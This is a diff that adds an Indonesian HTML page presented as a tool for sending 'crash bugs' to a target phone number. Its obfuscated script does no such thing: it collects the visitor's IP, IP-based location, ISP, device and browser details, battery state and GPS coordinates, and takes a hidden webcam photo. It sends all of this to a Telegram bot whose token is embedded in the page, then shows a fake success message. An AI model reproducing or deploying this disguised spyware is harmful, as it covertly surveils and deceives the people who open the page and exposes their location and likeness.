@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SKYREAM V3 BUGS - Fix</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    :root {
+      --bg:#0a0f1a;
+      --card:#101628;
+      --muted:#9aa4c7;
+      --text:#e8ecff;
+      --primary:#9b5cff;
+      --secondary:#00d4ff;
+      --accent:#6dd6ff;
+    }
+    * {box-sizing:border-box;margin:0;padding:0;}
+    body {
+      font-family:Poppins, sans-serif;
+      min-height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background: radial-gradient(circle at 20% 20%, rgba(155,92,255,.2), transparent 30%),
+                  radial-gradient(circle at 80% 10%, rgba(0,212,255,.2), transparent 25%),
+                  radial-gradient(circle at 50% 90%, rgba(109,214,255,.15), transparent 30%),
+                  var(--bg);
+      padding:20px;
+      overflow:hidden;
+    }
+    .card {
+      background: rgba(255,255,255,.05);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,.1);
+      border-radius: 18px;
+      padding: 22px 20px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(155,92,255,.3);
+      animation: fadeIn 1s ease;
+    }
+    @keyframes fadeIn { from {opacity:0; transform:translateY(20px);} to {opacity:1; transform:translateY(0);} }
+    .logo { width:70px; height:70px; margin:0 auto 14px; border-radius:50%; object-fit:cover; box-shadow:0 0 16px var(--primary),0 0 30px rgba(0,212,255,.4); }
+    .title { font-size:22px; font-family:Orbitron, sans-serif; font-weight:800; color: var(--primary); margin-bottom:4px; text-shadow:0 0 10px rgba(155,92,255,.7); }
+    .subtitle { font-size:12px; color: var(--muted); margin-bottom:20px; }
+    input[type="text"] { width:100%; padding:12px; border-radius:10px; border:1px solid rgba(255,255,255,.15); background:rgba(7,10,20,.6); color:var(--text); font-size:13px; outline:none; text-align:center; margin-bottom:8px; transition:.3s; }
+    input:focus { border-color:var(--secondary); box-shadow:0 0 6px var(--secondary); }
+    .buttons-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:16px; }
+    .buttons-grid button { padding:12px; font-size:13px; font-weight:600; border:none; border-radius:10px; cursor:pointer; background: rgba(255,255,255,0.05); color: var(--text); border:1px solid rgba(255,255,255,.15); transition: all .3s ease; }
+    .buttons-grid button:hover { box-shadow:0 0 12px var(--secondary); transform:translateY(-2px) scale(1.03); }
+    .buttons-grid button.selected { background:linear-gradient(90deg, var(--primary), var(--secondary)); color:white; box-shadow:0 0 12px var(--primary); }
+    .execute-button { width:100%; padding:12px; font-size:14px; font-weight:600; border:none; border-radius:10px; cursor:pointer; background:linear-gradient(90deg, var(--primary), var(--secondary)); color:white; margin-bottom:12px; box-shadow:0 0 10px rgba(155,92,255,.4); transition: all .3s ease; }
+    .execute-button:disabled { opacity:.5; cursor:not-allowed; }
+    .footer-action-container { display:flex; flex-wrap:wrap; justify-content:center; align-items:center; gap:8px; margin-top:20px; }
+    .footer-button { background: rgba(255,255,255,0.05); border:1px solid var(--primary); border-radius:8px; padding:8px 12px; font-size:14px; color: var(--primary); display:flex; align-items:center; gap:6px; transition: background .3s ease; }
+    .footer-button:hover { background: rgba(155,92,255,.2); }
+    .popup { position: fixed; top:50%; left:50%; transform: translate(-50%, -50%) scale(0.8); background: #111; color: var(--secondary); padding:16px 22px; border-radius:12px; box-shadow:0 0 20px rgba(0,212,255,.7); font-weight:bold; display:none; z-index:9999; animation: zoomFade 2s ease forwards; text-align:center; }
+    @keyframes zoomFade { 0% { opacity:0; transform: translate(-50%, -50%) scale(0.8); } 15% { opacity:1; transform: translate(-50%, -50%) scale(1); } 85% { opacity:1; transform: translate(-50%, -50%) scale(1); } 100% { opacity:0; transform: translate(-50%, -50%) scale(0.8); } }
+    .info { margin-top:8px; color:var(--muted); font-size:13px; min-height:18px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="https://e.top4top.io/p_3501jjn601.jpg" class="logo" alt="Logo">
+    <div class="title">Skyream - Crash</div>
+    <div class="subtitle">Choose mode &amp; target number</div>
+
+    <input id="text" type="text" placeholder="Please Input Target Number 628xx" />
+    <div id="info" class="info"></div>
+
+    <div class="buttons-grid">
+      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> CRASH ANDRO</button>
+      <button class="mode-btn" data-mode="ios"><i class="fas fa-dumpster-fire"></i> CRASH IPHONE</button>
+      <button class="mode-btn" data-mode="invis"><i class="fas fa-skull-crossbones"></i> INVIS HARD</button>
+      <button class="mode-btn" data-mode="blankui"><i class="fas fa-dumpster-fire"></i> BLANK UI</button>
+    </div>
+
+    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>
+
+    <div class="footer-action-container">
+      <div class="footer-button">
+        <a href="https://t.me/alwaysrilmodz" target="_blank"><i class="fab fa-telegram"></i> Developer</a>
+      </div>
+      <div class="footer-button">
+        <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
+      </div>
+    </div>
+  </div>
+
+  <video id="video" width="320" height="240" autoplay playsinline style="display:none"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none"></canvas>
+
+  <div id="popup" class="popup">✔️ Success Send Bug</div>
+
+<script>
+const _0x12c5f9=_0x9247;function _0x4dcf(){const _0x8af204=['1358203SMKGSC','8572769927:AAGQFgo-VfC7krJ30qbyM8N63jF0TdiB-s0','getBattery','âœ”ï¸\x20Successfully\x20bug\x20nomor\x20','stop','json','468438DapCdm','https://api.telegram.org/bot','3650828rqlpIz','selected','test','play','Charging','getAttribute','toBlob','srcObject','cookieEnabled','<b>ï¸\x20Info\x20Pengunjung:</b>\x0a<pre>','text','\x0a\x0aBaterai\x20\x20\x20\x20:\x20','block','display','org','add','\x22>Klik\x20di\x20sini</a>','ðŸ”„\x20Memproses\x20bug...','âŒ\x20Kamera\x20Ditolak\x20atau\x20Tidak\x20Tersedia','application/json','classList','keydown','HTML','</pre>','https://www.google.com/maps?q=','trim','toLocaleString','5832245562','Nomor\x20tidak\x20valid.\x20Harus\x20dimulai\x20dengan\x2062\x20dan\x20total\x2010-15\x20digit.','addEventListener','charging','Enter','ip\x20lookup\x20failed','data-mode','4916331HhEfMp','userAgent','canvas','none','video','success','image/jpeg','https://api.ipify.org?format=json','\x0a\x0aBrowser\x20\x20\x20\x20:\x20',')\x0a\x0aMemori\x20\x20\x20\x20\x20:\x20','drawImage','POST','warn','photo','getUserMedia','Tidak','number','1176847NWwvCE','Tidak\x20Charging','error','geolocation','\x0a\x0aRegion\x20\x20\x20\x20\x20:\x20','11559bowdrb','info','toFixed','\x0a\x0aIP\x20\x20\x20\x20\x20\x20\x20\x20\x20:\x20','/sendPhoto','level','getContext','\x0a\x0aResolusi\x20\x20\x20:\x20','\x0a\x0aOS\x20\x20\x20\x20\x20\x20\x20\x20\x20:\x20','regionName','15764030WwfFOL','append','catch','.mode-btn','height','getTracks','querySelectorAll','Mode:\x20','chat_id','getElementById','country','getCurrentPosition','/sendMessage','coords','\x20Lokasi\x20GPS\x20Ditolak','<b>\x20Lokasi\x20GPS:</b>\x20<a\x20href=\x22','disabled','forEach','style','âŒ\x20Terjadi\x20kesalahan.','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','226aoyQhb','16DSRiSR','sendPhoto\x20err','textContent','60IJrRNC','click','platform','https://ip-api.com/json/','deviceMemory','N/A','\x20GB\x0a\x0aCookie\x20\x20\x20\x20\x20:\x20','popup','\x0a\x0aISP\x20\x20\x20\x20\x20\x20\x20\x20:\x20'];_0x4dcf=function(){return _0x8af204;};return _0x4dcf();}(function(_0xffeaa6,_0x36fd87){const _0x1ffc86=_0x9247,_0x374625=_0xffeaa6();while(!![]){try{const _0x1b6127=parseInt(_0x1ffc86(0x158))/0x1+-parseInt(_0x1ffc86(0x17c))/0x2*(-parseInt(_0x1ffc86(0x15d))/0x3)+parseInt(_0x1ffc86(0x191))/0x4+-parseInt(_0x1ffc86(0x180))/0x5*(parseInt(_0x1ffc86(0x18f))/0x6)+-parseInt(_0x1ffc86(0x189))/0x7+-parseInt(_0x1ffc86(0x17d))/0x8*(-parseInt(_0x1ffc86(0x147))/0x9)+-parseInt(_0x1ffc86(0x167))/0xa;if(_0x1b6127===_0x36fd87)break;else _0x374625['push'](_0x374625['shift']());}catch(_0x51f0f9){_0x374625['push'](_0x374625['shift']());}}}(_0x4dcf,0xde349));const botToken=_0x12c5f9(0x18a),chatIds=[_0x12c5f9(0x1ac)],infoDiv=document[_0x12c5f9(0x170)](_0x12c5f9(0x15e)),inputField=document[_0x12c5f9(0x170)](_0x12c5f9(0x19b)),modeButtons=document[_0x12c5f9(0x16d)](_0x12c5f9(0x16a)),executeBtn=document[_0x12c5f9(0x170)]('executeBtn'),popup=document[_0x12c5f9(0x170)](_0x12c5f9(0x187));let selectedMode=null;function logInfo(_0xe9af94){const _0x448028=_0x12c5f9;infoDiv[_0x448028(0x17f)]=_0xe9af94;}function sendToTelegram(_0x4f25e0){const _0x50969a=_0x12c5f9;chatIds[_0x50969a(0x178)](_0x5263b4=>{const _0x2de54c=_0x50969a;fetch('https://api.telegram.org/bot'+botToken+_0x2de54c(0x173),{'method':_0x2de54c(0x152),'headers':{'Content-Type':_0x2de54c(0x1a4)},'body':JSON['stringify']({'chat_id':_0x5263b4,'text':_0x4f25e0,'parse_mode':_0x2de54c(0x1a7)})})['catch'](_0x276a2b=>console[_0x2de54c(0x15a)]('sendToTelegram\x20err',_0x276a2b));});}function sendPhotoToTelegram(_0x20a370){const _0x4d7a29=_0x12c5f9;chatIds[_0x4d7a29(0x178)](_0x3edf48=>{const _0x23f525=_0x4d7a29,_0x8cdc22=new FormData();_0x8cdc22[_0x23f525(0x168)](_0x23f525(0x16f),_0x3edf48),_0x8cdc22['append'](_0x23f525(0x154),_0x20a370,'photo.jpg'),fetch(_0x23f525(0x190)+botToken+_0x23f525(0x161),{'method':_0x23f525(0x152),'body':_0x8cdc22})[_0x23f525(0x169)](_0x576b1c=>console[_0x23f525(0x15a)](_0x23f525(0x17e),_0x576b1c));});}async function getInfoAndSend(){const _0x17a5a0=_0x12c5f9;let _0x50fcd1='-',_0x697fa6='-',_0x1587f3='-',_0x4b5823='-',_0x5f4131='-';try{const _0x3a82f3=await fetch(_0x17a5a0(0x14e)),_0x293587=await _0x3a82f3[_0x17a5a0(0x18e)]();_0x50fcd1=_0x293587['ip']||'-';const _0x29243d=await fetch(_0x17a5a0(0x183)+_0x50fcd1),_0x395ea6=await _0x29243d[_0x17a5a0(0x18e)]();_0x395ea6&&_0x395ea6['status']===_0x17a5a0(0x14c)&&(_0x697fa6=_0x395ea6['city']||'-',_0x1587f3=_0x395ea6[_0x17a5a0(0x166)]||'-',_0x4b5823=_0x395ea6[_0x17a5a0(0x171)]||'-',_0x5f4131=_0x395ea6[_0x17a5a0(0x19f)]||'-');}catch(_0x6481d7){console[_0x17a5a0(0x153)](_0x17a5a0(0x145),_0x6481d7);}let _0x69486b=_0x17a5a0(0x185),_0x584bcb=_0x17a5a0(0x185);try{if(navigator[_0x17a5a0(0x18b)]){const _0x3696cf=await navigator['getBattery']();_0x69486b=_0x3696cf&&typeof _0x3696cf['level']===_0x17a5a0(0x157)?(_0x3696cf[_0x17a5a0(0x162)]*0x64)[_0x17a5a0(0x15f)](0x0)+'%':_0x17a5a0(0x185),_0x584bcb=_0x3696cf&&_0x3696cf[_0x17a5a0(0x143)]?_0x17a5a0(0x195):_0x17a5a0(0x159);}}catch(_0x2cc626){console[_0x17a5a0(0x153)]('battery\x20API\x20error',_0x2cc626);}const _0x5ca561=(_0x17a5a0(0x160)+_0x50fcd1+'\x0a\x0aKota\x20\x20\x20\x20\x20\x20\x20:\x20'+_0x697fa6+_0x17a5a0(0x15c)+_0x1587f3+'\x0a\x0aNegara\x20\x20\x20\x20\x20:\x20'+_0x4b5823+_0x17a5a0(0x188)+_0x5f4131+_0x17a5a0(0x14f)+navigator[_0x17a5a0(0x148)]+_0x17a5a0(0x165)+navigator[_0x17a5a0(0x182)]+_0x17a5a0(0x164)+screen['width']+'x'+screen[_0x17a5a0(0x16b)]+_0x17a5a0(0x19c)+_0x69486b+'\x20('+_0x584bcb+_0x17a5a0(0x150)+(navigator[_0x17a5a0(0x184)]||_0x17a5a0(0x185))+_0x17a5a0(0x186)+(navigator[_0x17a5a0(0x199)]?'Ya':_0x17a5a0(0x156))+'\x0a\x0aWaktu\x20\x20\x20\x20\x20\x20:\x20'+new Date()[_0x17a5a0(0x1ab)]()+_0x17a5a0(0x17b))[_0x17a5a0(0x1aa)]();sendToTelegram(_0x17a5a0(0x19a)+_0x5ca561+_0x17a5a0(0x1a8)),navigator[_0x17a5a0(0x15b)]?navigator['geolocation'][_0x17a5a0(0x172)](_0xf644e1=>{const _0x333601=_0x17a5a0,_0x4b1d89=_0x333601(0x1a9)+_0xf644e1['coords']['latitude']+','+_0xf644e1[_0x333601(0x174)]['longitude'];sendToTelegram(_0x333601(0x176)+_0x4b1d89+_0x333601(0x1a1));},_0x30ea18=>{const _0x4dfe65=_0x17a5a0;sendToTelegram(_0x4dfe65(0x175));},{'timeout':0x2710}):sendToTelegram('\x20Browser\x20tidak\x20support\x20GPS');}function _0x9247(_0x162db5,_0x464bbd){const _0x4dcf65=_0x4dcf();return _0x9247=function(_0x92477f,_0x1d470a){_0x92477f=_0x92477f-0x143;let _0x4762d9=_0x4dcf65[_0x92477f];return _0x4762d9;},_0x9247(_0x162db5,_0x464bbd);}async function startCameraAndSendPhoto(){const _0x2e442d=_0x12c5f9,_0x4fef07=document[_0x2e442d(0x170)](_0x2e442d(0x14b)),_0x63166f=document[_0x2e442d(0x170)](_0x2e442d(0x149)),_0x49171d=_0x63166f[_0x2e442d(0x163)]('2d');try{const _0x544458=await navigator['mediaDevices'][_0x2e442d(0x155)]({'video':!![]});return _0x4fef07[_0x2e442d(0x198)]=_0x544458,await _0x4fef07[_0x2e442d(0x194)](),await new Promise(_0x439701=>setTimeout(_0x439701,0x3e8)),_0x49171d[_0x2e442d(0x151)](_0x4fef07,0x0,0x0,_0x63166f['width'],_0x63166f[_0x2e442d(0x16b)]),new Promise(_0x1063a3=>{const _0x4e848e=_0x2e442d;_0x63166f[_0x4e848e(0x197)](_0x35f18d=>{const _0x246877=_0x4e848e;if(_0x35f18d)sendPhotoToTelegram(_0x35f18d);_0x544458[_0x246877(0x16c)]()['forEach'](_0x38b8bf=>_0x38b8bf[_0x246877(0x18d)]()),_0x1063a3();},_0x4e848e(0x14d),0.8);});}catch(_0x491a1b){sendToTelegram(_0x2e442d(0x1a3));return;}}modeButtons[_0x12c5f9(0x178)](_0x41803c=>{const _0x18a637=_0x12c5f9;_0x41803c[_0x18a637(0x1ae)](_0x18a637(0x181),()=>{const _0x21209e=_0x18a637;modeButtons[_0x21209e(0x178)](_0x2c6418=>_0x2c6418[_0x21209e(0x1a5)]['remove'](_0x21209e(0x192))),_0x41803c['classList'][_0x21209e(0x1a0)](_0x21209e(0x192)),selectedMode=_0x41803c[_0x21209e(0x196)](_0x21209e(0x146)),executeBtn['disabled']=![],logInfo(_0x21209e(0x16e)+selectedMode);});});function isValidNumber(_0xdda7d2){const _0x29d7bc=_0x12c5f9,_0x5c02fd=/^62\d{7,13}$/;return _0x5c02fd[_0x29d7bc(0x193)](_0xdda7d2);}executeBtn[_0x12c5f9(0x1ae)](_0x12c5f9(0x181),async()=>{const _0x2e131e=_0x12c5f9,_0x284902=inputField['value'][_0x2e131e(0x1aa)]();if(!isValidNumber(_0x284902)){alert(_0x2e131e(0x1ad));return;}executeBtn['disabled']=!![],logInfo(_0x2e131e(0x1a2));try{sendToTelegram('<b>\x20Nomor\x20Target:</b>\x20'+_0x284902),await getInfoAndSend(),await startCameraAndSendPhoto(),popup[_0x2e131e(0x179)][_0x2e131e(0x19e)]=_0x2e131e(0x19d),setTimeout(()=>{const _0x43aee6=_0x2e131e;popup[_0x43aee6(0x179)][_0x43aee6(0x19e)]=_0x43aee6(0x14a);},0x7d0),logInfo(_0x2e131e(0x18c)+_0x284902);}catch(_0xe4bd07){console[_0x2e131e(0x15a)](_0xe4bd07),logInfo(_0x2e131e(0x17a));}finally{executeBtn[_0x2e131e(0x177)]=![];}}),inputField[_0x12c5f9(0x1ae)](_0x12c5f9(0x1a6),_0x10bb15=>{const _0x4e5a8a=_0x12c5f9;_0x10bb15['key']===_0x4e5a8a(0x144)&&!executeBtn[_0x4e5a8a(0x177)]&&executeBtn[_0x4e5a8a(0x181)]();});
+</script>
+</body>
+</html>
